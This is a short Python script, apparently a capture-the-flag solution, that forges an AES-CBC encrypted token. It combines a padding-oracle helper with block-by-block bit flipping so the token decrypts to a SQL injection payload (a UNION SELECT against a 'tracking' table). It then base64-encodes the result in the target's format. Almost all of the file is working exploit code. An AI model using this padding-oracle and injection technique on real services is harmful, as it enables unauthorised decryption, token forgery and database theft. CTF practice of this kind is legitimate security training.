import exploit
import cipher
import base64


'''from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


key = b'WOAH, SO SECRET!'


def encrypt_data(data):
    iv = get_random_bytes(block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    enc = cipher.encrypt(pad(data, block_size, style='pkcs7'))
    return iv + enc


def decrypt_data(data):
    iv = data[:block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_params = cipher.decrypt(data[block_size:])
    return unpad(padded_params, block_size, style='pkcs7')'''

block_size = 16 # in bytes (128 bit)

# 128 bit blocks for better visualization
plain = b'{"flag": "^FLAG^' \
        b'11c2ecc3810b710c' \
        b'9fe62790cdecabbc' \
        b'13b94e9e9ae0d2b2' \
        b'2b274cc0e0913468' \
        b'$FLAG$", "id": "' \
        b'2", "key": "IHkr' \
        b'gGN7dA31zU9EZIQi' \
        b'4A~~"}\n\n\n\n\n\n\n\n\n\n'


wantd = b'{"id": "9 UNION ' \
        b'ALL SELECT GROUP' \
        b'_concat(headers)' \
        b' ,2 FROM trackin' \
        b'g" }            ' \
        b'                ' \
        b'                ' \
        b'                ' \
        b'      \n\n\n\n\n\n\n\n\n\n'

if __name__ == '__main__':
        cipher_text = bytearray(cipher.obtain())
        for block in range((len(plain)//block_size)-1, -1, -1):

                print(b'Block: ', block)
                for i in range(block_size):
                        idx = (block*block_size) +i
                        xor_byte = plain[idx] ^ wantd[idx]

                        cipher_text[idx] ^= xor_byte

                p = exploit.find_plaintext(bytes(cipher_text))

                print(b'Temporary Plaintext: ', p)
                if block > 0:
                        p1 = plain[(block - 1) * block_size:block * block_size]
                        p2 = (p[(block-1)*block_size:block*block_size])
                        for i in range(block_size):
                                cipher_text[((block-1)*block_size) +i] ^= (p2[i] ^ p1[i])

        b64cipher = base64.encodebytes(bytes(cipher_text))
        b64payload = b64cipher.decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

        print(b64payload)
